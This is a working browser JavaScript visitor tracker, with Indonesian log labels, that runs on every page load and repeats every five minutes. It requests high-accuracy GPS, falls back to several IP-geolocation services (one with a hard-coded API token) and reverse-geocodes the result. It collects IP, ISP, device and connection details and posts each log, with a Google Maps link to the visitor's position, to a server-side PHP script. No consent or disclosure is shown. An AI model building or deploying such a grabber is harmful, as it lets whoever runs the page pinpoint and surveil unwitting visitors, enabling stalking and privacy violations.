// Fetch visitor data using Geolocation API and fallback to IP info service
async function fetchVisitorData() {
    try {
        let visitorData = null;
        
        // Try to get location using Geolocation API first
        try {
            const geolocationData = await getGeolocation();
            if (geolocationData) {
                visitorData = geolocationData;
                // Get additional IP data even when geolocation succeeds
                try {
                    const ipData = await fetchIpInfo();
                    // Merge IP data with geolocation data (preserving the more accurate coordinates)
                    visitorData = {
                        ...ipData,
                        location: {
                            ...ipData.location,
                            city: visitorData.location.city || ipData.location.city,
                            region: visitorData.location.region || ipData.location.region,
                            country: visitorData.location.country || ipData.location.country,
                            coordinates: visitorData.location.coordinates, // Keep the more accurate coordinates
                            mapLink: visitorData.location.mapLink // Keep the more accurate map link
                        }
                    };
                } catch (ipError) {
                    console.warn('Could not fetch additional IP data:', ipError.message);
                }
            }
        } catch (geoError) {
            console.warn('Geolocation failed:', geoError.message);
        }
        
        // If geolocation failed or didn't return data, fall back to IP-based methods
        if (!visitorData) {
            // Try primary IP service
            try {
                visitorData = await fetchIpInfo();
            } catch (ipError) {
                console.warn('Primary IP service failed:', ipError.message);
                
                // Try secondary IP service if primary fails
                try {
                    visitorData = await fetchSecondaryIpInfo();
                } catch (secondaryError) {
                    console.warn('Secondary IP service failed:', secondaryError.message);
                    throw new Error('All location services failed');
                }
            }
        }
        
        // Enhanced accuracy check and improvement
        if (visitorData) {
            // Try to improve accuracy using HTML5 positioning if available
            if ('geolocation' in navigator && !visitorData.highAccuracy) {
                try {
                    const enhancedPosition = await getEnhancedPosition();
                    if (enhancedPosition) {
                        visitorData.location.coordinates = enhancedPosition.coordinates;
                        visitorData.location.mapLink = enhancedPosition.mapLink;
                        visitorData.highAccuracy = enhancedPosition.accuracy < 1;
                    }
                } catch (enhanceError) {
                    console.warn('Could not enhance position accuracy:', enhanceError.message);
                }
            }
            
            return visitorData;
        }
        
        throw new Error('Could not determine visitor location');
        
    } catch (error) {
        console.error('Failed to fetch visitor data:', error.message);

        // Fallback data for when all methods fail
        return {
            timestamp: new Date().toLocaleString(),
            deviceName: navigator.userAgent || 'Unknown Device',
            browser: detectBrowser(),
            ipAddress: await getFallbackIpAddress(),
            location: {
                city: 'Unknown City',
                region: 'Unknown Region',
                country: 'Unknown Country',
                coordinates: '0,0',
                mapLink: '#' // No link for unknown location
            },
            isp: 'Unknown ISP',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            vpnDetected: false,
            connectionType: getConnectionType()
        };
    }
}

// Try to get fallback IP address from multiple services
async function getFallbackIpAddress() {
    try {
        const services = [
            'https://api.ipify.org?format=json',
            'https://api64.ipify.org?format=json'
        ];
        
        for (const service of services) {
            try {
                const response = await fetch(service, { timeout: 3000 });
                if (response.ok) {
                    const data = await response.json();
                    if (data.ip) return data.ip;
                }
            } catch (e) {
                console.warn(`IP service ${service} failed:`, e.message);
            }
        }
    } catch (e) {
        console.error('All IP fallback services failed:', e.message);
    }
    
    return '127.0.0.1';
}

// Get enhanced high-accuracy position
async function getEnhancedPosition() {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                resolve({
                    coordinates: `${latitude},${longitude}`,
                    mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
                    accuracy: accuracy
                });
            },
            (error) => reject(error),
            { 
                enableHighAccuracy: true, 
                timeout: 15000, 
                maximumAge: 0 
            }
        );
    });
}

// Get location using Geolocation API and reverse geocode it
async function getGeolocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            return reject(new Error('Geolocation is not supported by this browser.'));
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                
                // Check if accuracy meets our requirements
                const highAccuracy = accuracy <= 1; // 1 meter or better
                if (!highAccuracy) {
                    console.warn(`Location accuracy is ${accuracy} meters, which is not within the desired range.`);
                }

                // Reverse geocode to get city, region, and country
                const locationData = await reverseGeocode(latitude, longitude);

                resolve({
                    timestamp: new Date().toLocaleString(),
                    deviceName: navigator.userAgent || 'Unknown Device',
                    browser: detectBrowser(),
                    ipAddress: await getFallbackIpAddress(), // Still try to get IP
                    location: {
                        city: locationData.city,
                        region: locationData.region,
                        country: locationData.country,
                        coordinates: `${latitude},${longitude}`,
                        mapLink: `https://www.google.com/maps?q=${latitude},${longitude}` // Link to Google Maps
                    },
                    isp: await getIspInfo(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    vpnDetected: false,
                    highAccuracy: highAccuracy,
                    accuracy: accuracy,
                    connectionType: getConnectionType()
                });
            },
            (error) => {
                console.warn('Geolocation API failed:', error.message);
                reject(error);
            },
            { 
                enableHighAccuracy: true, 
                timeout: 15000, 
                maximumAge: 0 
            }
        );
    });
}

// Get connection type information if available
function getConnectionType() {
    if (navigator.connection) {
        return {
            effectiveType: navigator.connection.effectiveType || 'unknown',
            downlink: navigator.connection.downlink || 'unknown',
            rtt: navigator.connection.rtt || 'unknown',
            saveData: navigator.connection.saveData || false
        };
    }
    return 'unknown';
}

// Try to get ISP information from multiple sources
async function getIspInfo() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (response.ok) {
            const data = await response.json();
            return data.org || 'Unknown ISP';
        }
    } catch (e) {
        console.warn('Could not fetch ISP info:', e.message);
    }
    return 'Unknown ISP';
}

// Reverse geocode coordinates using multiple services for better accuracy
async function reverseGeocode(latitude, longitude) {
    // Try multiple geocoding services for redundancy
    const services = [
        // Nominatim (OpenStreetMap)
        async () => {
            const response = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
                { 
                    headers: { 'User-Agent': 'VisitorTracking/1.0' } // Required by Nominatim
                }
            );
            
            if (!response.ok) throw new Error(`Nominatim failed: ${response.status}`);
            
            const data = await response.json();
            return { 
                city: data.address.city || data.address.town || data.address.village || 'Unknown City',
                region: data.address.state || 'Unknown Region',
                country: data.address.country || 'Unknown Country',
                service: 'nominatim'
            };
        },
        
        // Geocode.xyz (alternative service)
        async () => {
            const response = await fetch(
                `https://geocode.xyz/${latitude},${longitude}?geoit=json&auth=123456789012345678901234`
            );
            
            if (!response.ok) throw new Error(`Geocode.xyz failed: ${response.status}`);
            
            const data = await response.json();
            return {
                city: data.city || 'Unknown City',
                region: data.region || 'Unknown Region',
                country: data.country || 'Unknown Country',
                service: 'geocode.xyz'
            };
        },
        
        // BigDataCloud (another alternative)
        async () => {
            const response = await fetch(
                `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=id`
            );
            
            if (!response.ok) throw new Error(`BigDataCloud failed: ${response.status}`);
            
            const data = await response.json();
            return {
                city: data.city || data.locality || 'Unknown City',
                region: data.principalSubdivision || 'Unknown Region',
                country: data.countryName || 'Unknown Country',
                service: 'bigdatacloud'
            };
        }
    ];
    
    // Try each service in sequence until one works
    for (const serviceFunc of services) {
        try {
            return await serviceFunc();
        } catch (error) {
            console.warn(`Geocoding service failed:`, error.message);
            // Continue to next service
        }
    }
    
    // Fallback if all services fail
    return { 
        city: 'Unknown City', 
        region: 'Unknown Region', 
        country: 'Unknown Country',
        service: 'none'
    };
}

// Fetch location data from ipinfo.io (primary IP service)
async function fetchIpInfo() {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000); // Timeout after 5 seconds

    try {
        const response = await fetch("https://ipinfo.io/json?token=6fc5638cf891d2", {
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            throw new Error(`Network response was not ok: ${response.status}`);
        }

        const data = await response.json();

        // Validate received data
        if (!data.ip || !data.loc) {
            throw new Error('Incomplete data received from API');
        }

        const [latitude, longitude] = data.loc.split(',');

        return {
            timestamp: new Date().toLocaleString(),
            deviceName: navigator.userAgent || 'Unknown Device',
            browser: detectBrowser(),
            ipAddress: data.ip,
            location: {
                city: data.city || 'Unknown City',
                region: data.region || 'Unknown Region',
                country: data.country || 'Unknown Country',
                coordinates: `${latitude},${longitude}`,
                mapLink: `https://www.google.com/maps?q=${latitude},${longitude}` // Link to Google Maps
            },
            isp: data.org || 'Unknown ISP',
            timezone: data.timezone || 'Unknown Timezone',
            vpnDetected: data.bogon || false,
            highAccuracy: false, // IP-based location is not high accuracy
            connectionType: getConnectionType()
        };
    } catch (error) {
        console.error('IP info service failed:', error.message);
        throw error;
    }
}

// Secondary IP info service as fallback
async function fetchSecondaryIpInfo() {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    try {
        const response = await fetch("https://ipapi.co/json/", {
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            throw new Error(`Secondary IP service failed: ${response.status}`);
        }

        const data = await response.json();

        // Validate data
        if (!data.ip || !data.latitude || !data.longitude) {
            throw new Error('Incomplete data from secondary IP service');
        }

        return {
            timestamp: new Date().toLocaleString(),
            deviceName: navigator.userAgent || 'Unknown Device',
            browser: detectBrowser(),
            ipAddress: data.ip,
            location: {
                city: data.city || 'Unknown City',
                region: data.region || 'Unknown Region',
                country: data.country_name || 'Unknown Country',
                coordinates: `${data.latitude},${data.longitude}`,
                mapLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
            },
            isp: data.org || 'Unknown ISP',
            timezone: data.timezone || 'Unknown Timezone',
            vpnDetected: false,
            highAccuracy: false,
            connectionType: getConnectionType()
        };
    } catch (error) {
        console.error('Secondary IP service failed:', error.message);
        throw error;
    }
}

// Detect browser name
function detectBrowser() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Google Chrome";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
    if (userAgent.includes("Edg")) return "Microsoft Edge";
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
    if (userAgent.includes("MSIE") || userAgent.includes("Trident/")) return "Internet Explorer";
    
    // Detect mobile browsers
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        if (userAgent.includes("Instagram")) return "Instagram In-App Browser";
        if (userAgent.includes("FBAV") || userAgent.includes("FBAN")) return "Facebook In-App Browser";
        if (userAgent.includes("Twitter")) return "Twitter In-App Browser";
        if (userAgent.includes("Line")) return "Line In-App Browser";
        
        // Generic mobile browser detection
        if (userAgent.includes("Android")) return "Android Browser";
        if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "Safari Mobile";
    }
    
    return "Unknown Browser";
}

// Log visitor data to the page and save to file
async function logVisitorData() {
    const visitorData = await fetchVisitorData();
    if (!visitorData) return;

    const logEntry = `
==============================================================
📅 Hari: ${new Date().toLocaleDateString('id-ID', { weekday: 'long' })}
📅 Tanggal: ${new Date().toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' })}
⏰ Waktu: ${new Date().toLocaleTimeString('id-ID')}
==============================================================
💻 Perangkat: ${visitorData.deviceName}
🌐 Browser: ${visitorData.browser}
🌍 IP Address: ${visitorData.ipAddress}
📍 Lokasi: 
  - Kota: ${visitorData.location.city}
  - Provinsi: ${visitorData.location.region}
  - Negara: ${visitorData.location.country}
  - Koordinat: ${visitorData.location.coordinates}
  - 🔗 <a href="${visitorData.location.mapLink}" target="_blank" style="color:blue; text-decoration:underline;">Lihat Lokasi di Peta</a>
📡 Provider: ${visitorData.isp}
🕒 Zona Waktu: ${visitorData.timezone}
${visitorData.accuracy ? `📏 Akurasi: ${visitorData.accuracy} meter` : ''}
${visitorData.connectionType !== 'unknown' ? `🔌 Koneksi: ${typeof visitorData.connectionType === 'object' ? 
    `${visitorData.connectionType.effectiveType} (${visitorData.connectionType.downlink} Mbps)` : 
    visitorData.connectionType}` : ''}
==============================================================
`;

    displayVisitorData(logEntry);
    saveLogToFile(visitorData);
}

// Display visitor data on the page
function displayVisitorData(logEntry) {
    const visitorDataElement = document.getElementById('visitor-data');
    if (visitorDataElement) {
        visitorDataElement.innerHTML = logEntry.replace(/\n/g, "<br>");
    } else {
        console.warn("Element with id 'visitor-data' not found.");
        
        // Create element if it doesn't exist
        const containerDiv = document.createElement('div');
        containerDiv.id = 'visitor-data';
        containerDiv.innerHTML = logEntry.replace(/\n/g, "<br>");
        containerDiv.style.padding = '10px';
        containerDiv.style.margin = '10px';
        containerDiv.style.border = '1px solid #ccc';
        containerDiv.style.borderRadius = '5px';
        containerDiv.style.backgroundColor = '#f9f9f9';
        containerDiv.style.fontFamily = 'Arial, sans-serif';
        
        document.body.appendChild(containerDiv);
    }
}

// Save visitor data to IP.txt
function saveLogToFile(visitorData) {
    const logEntry = `
[${visitorData.timestamp}]
- IP Address: ${visitorData.ipAddress}
- Device: ${visitorData.deviceName}
- Browser: ${visitorData.browser}
- Location: 
  - Kota: ${visitorData.location.city}
  - Provinsi: ${visitorData.location.region}
  - Negara: ${visitorData.location.country}
  - Koordinat: ${visitorData.location.coordinates}
  - 🌍 Google Maps: ${visitorData.location.mapLink}
- ISP: ${visitorData.isp}
- Timezone: ${visitorData.timezone}
- VPN Detected: ${visitorData.vpnDetected ? "Yes" : "No"}
- High Accuracy: ${visitorData.highAccuracy ? "Yes" : "No"}
${visitorData.accuracy ? `- Accuracy: ${visitorData.accuracy} meters` : ''}
${visitorData.connectionType !== 'unknown' ? `- Connection: ${typeof visitorData.connectionType === 'object' ? 
    `${visitorData.connectionType.effectiveType} (${visitorData.connectionType.downlink} Mbps)` : 
    visitorData.connectionType}` : ''}
`;

    // Send log to server-side PHP script with additional security
    fetch('/save-log.php', {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify({ 
            log: logEntry,
            token: generateSecurityToken()
        }),
    }).then((response) => {
        if (response.ok) {
            console.log('Log saved successfully');
        } else {
            console.error('Failed to save log:', response.statusText);
            // Fallback to localStorage if server logging fails
            saveToLocalStorage(logEntry);
        }
    }).catch((error) => {
        console.error('Failed to save log:', error.message);
        // Fallback to localStorage
        saveToLocalStorage(logEntry);
    });
}

// Generate a simple security token
function generateSecurityToken() {
    return btoa(navigator.userAgent + new Date().toISOString());
}

// Save to localStorage as fallback
function saveToLocalStorage(logEntry) {
    try {
        const logs = JSON.parse(localStorage.getItem('visitorLogs') || '[]');
        logs.push(logEntry);
        localStorage.setItem('visitorLogs', JSON.stringify(logs));
    } catch (e) {
        console.error('Could not save to localStorage:', e.message);
    }
}

// Initialize logging of visitor data
document.addEventListener('DOMContentLoaded', logVisitorData);

// Add periodic update to catch any changes in location
setInterval(async () => {
    try {
        await logVisitorData();
    } catch (e) {
        console.warn('Periodic update failed:', e.message);
    }
}, 300000); // Update every 5 minutes